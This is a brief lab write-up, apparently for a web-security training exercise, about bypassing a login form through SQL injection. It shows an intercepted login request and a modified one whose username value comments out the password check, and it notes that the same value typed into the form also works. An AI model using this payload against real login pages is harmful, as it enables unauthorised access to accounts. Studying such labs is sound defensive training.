
This lab contains a SQL injection vuln in the login Function

We intercept the login request and we got this


```
csrf=scicZeX50tYmirs8GOgY5ErUU5TfSFwC&username=Administrator&password=password
```

Now you can edit it in the next 2 ways:

```
csrf=scicZeX50tYmirs8GOgY5ErUU5TfSFwC&username=Administrator'--&password=password
```

It also forks from the web using Administrator' -- as an username and the password could be whatever
